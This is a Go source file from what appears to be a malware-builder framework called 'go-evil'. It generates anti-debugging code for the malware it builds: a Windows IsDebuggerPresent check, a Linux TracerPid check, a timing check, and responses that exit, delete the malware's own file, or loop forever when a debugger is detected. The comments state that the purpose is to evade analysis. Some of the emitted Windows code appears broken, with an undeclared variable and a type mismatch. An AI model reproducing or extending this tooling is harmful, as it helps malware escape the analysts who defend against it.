package parsing

import (
	"github.com/TeamPhoneix/go-evil/utility/structure"
)

//
//
// Adds the responsible code used for detecting if the malware is launched
// under a debugger
//
//
func identify_debugger(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func detect_debugger() bool {", "toReturn := false"}

	if data_object.Target_os == "windows" {
		body = append(body,
			"driver = windows.NewLazyDLL(\"kernel32.dll\")",
			"toReturn = driver.NewProc(\"IsDebuggerPresent\")",
			"}")

		data_object.Add_go_import("golang.org/x/sys/windows")
	} else {
		body = append(body,
			"file, err := os.Open(\"/proc/self/status\")",
			"if err == nil {",
			"defer file.Close()",

			"for {",
			"var tpid int",
			"num, err := fmt.Fscanf(file, \"TracerPid: %d\\n\", &tpid)",
			"if err == io.EOF {",
			"break",
			"}",

			"if num != 0{",
			"if tpid != 0{",
			"toReturn = true",
			"}",
			"break",
			"}",

			"}}")

		data_object.Add_go_import("io")
		data_object.Add_go_import("fmt")

	}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}

//
//
// Adds the responsible code used for detecting if the malware is launched
// under a debugger by utilizing the time difference betwen two points
// This might mean that we get a false positive on slower computers.
// We use a random time to make it harder to get a pattern for the debuggers.
//
//
func identify_debugger_with_time(s_json string) string {
	data_object := structure.Receive(s_json)

	data_object.Add_go_function([]string{
		"func detect_debugger_time() bool {",
		"toReturn := false",
		"old := time.Now()",
		"a := 1",
		"b := 1",
		"for i := 0; i < 100; i++ {",
		"a = ((2 * i) % 2) + i + 20",
		"b = a % (b * 3)",
		"}",
		"new := time.Now()",
		"diff := new.Sub(old)",
		"if diff.Seconds() > float64(tools.Generate_random_int()) {",
		"toReturn = true",
		"}",
		"return toReturn",
		"}"})

	data_object.Add_go_import("time")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
	return structure.Send(data_object)
}

//
//
// Generate the debugger detection function
//
//
func stop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func stop_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"os.Exit(42)",
		"}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("os")

	return structure.Send(data_object)
}

//
//
// Generates the code which will remove the malware
// after it has been launched in a debugger
//
//
func remove_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func remove_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"os.Remove(spine.path)",
		"os.Exit(42)",
		"}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)
	data_object.Add_go_import("os")
	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")

	return structure.Send(data_object)
}

//
//
// Generates the code which will cause the malware to enter an infinite loop
//
//
func loop_behavior(s_json string) string {
	data_object := structure.Receive(s_json)
	body := []string{"func loop_behavior() bool {",
		"toReturn := false",
		"toReturn = detect_debugger()",
		"if toReturn {",
		"for {",
		"}}"}

	body = append(body, "return toReturn", "}")
	data_object.Add_go_function(body)

	return structure.Send(data_object)
}
